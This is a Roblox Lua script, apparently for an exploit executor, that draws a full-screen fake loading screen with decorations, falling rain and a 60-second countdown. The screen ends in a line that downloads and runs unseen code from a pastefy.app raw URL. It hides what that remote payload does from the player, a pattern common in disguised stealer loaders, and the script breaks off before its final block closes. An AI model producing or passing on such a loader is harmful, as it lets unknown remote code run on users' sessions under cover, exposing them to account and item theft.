local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "LoadingScreen"
ScreenGui.IgnoreGuiInset = true
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = game.CoreGui

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(1, 0, 1, 0)
Frame.BackgroundColor3 = Color3.fromRGB(235, 255, 235)
Frame.Parent = ScreenGui

-- Decorations (fake vines/fruits/flowers using colored frames for now)
for i = 1, 10 do
	local deco = Instance.new("Frame")
	deco.Size = UDim2.new(0, math.random(30,60), 0, math.random(30,60))
	deco.Position = UDim2.new(math.random(), 0, math.random(), 0)
	deco.BackgroundColor3 = Color3.fromRGB(math.random(200,255), math.random(100,200), math.random(100,200))
	deco.BorderSizePixel = 0
	deco.BackgroundTransparency = 0.3
	deco.ZIndex = 1
	deco.Parent = Frame
end

-- Countdown Text
local CountLabel = Instance.new("TextLabel")
CountLabel.Size = UDim2.new(0, 300, 0, 100)
CountLabel.Position = UDim2.new(0.5, -150, 0.5, -50)
CountLabel.BackgroundTransparency = 1
CountLabel.Text = "60s"
CountLabel.Font = Enum.Font.GothamBold
CountLabel.TextColor3 = Color3.fromRGB(0, 128, 0)
CountLabel.TextScaled = true
CountLabel.Parent = Frame

-- Loading Text (below)
local LoadingLabel = Instance.new("TextLabel")
LoadingLabel.Size = UDim2.new(0, 300, 0, 50)
LoadingLabel.Position = UDim2.new(0.5, -150, 0.5, 60)
LoadingLabel.BackgroundTransparency = 1
LoadingLabel.Text = ""
LoadingLabel.Font = Enum.Font.Gotham
LoadingLabel.TextColor3 = Color3.fromRGB(100, 100, 100)
LoadingLabel.TextScaled = true
LoadingLabel.Parent = Frame

-- Looping Rain
spawn(function()
	while true do
		local drop = Instance.new("Frame")
		drop.Size = UDim2.new(0, 2, 0, 10)
		drop.Position = UDim2.new(math.random(), 0, 0, 0)
		drop.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
		drop.BorderSizePixel = 0
		drop.Parent = Frame
		game:GetService("TweenService"):Create(drop, TweenInfo.new(1), {Position = UDim2.new(drop.Position.X.Scale, 0, 1, 0)}):Play()
		game.Debris:AddItem(drop, 1)
		wait(0.05)
	end
end)

-- Countdown logic
coroutine.wrap(function()
	local seconds = 60
	while seconds > 0 do
		CountLabel.Text = seconds .. "s"
		seconds -= 1
		wait(1)
	end

	CountLabel.Text = "Loading..."
	LoadingLabel.Text = "Please wait..."

	wait(3)

	-- Your loadstring goes here:
	loadstring(game:HttpGet("https://pastefy.app/EEmKlIPx/raw"))()
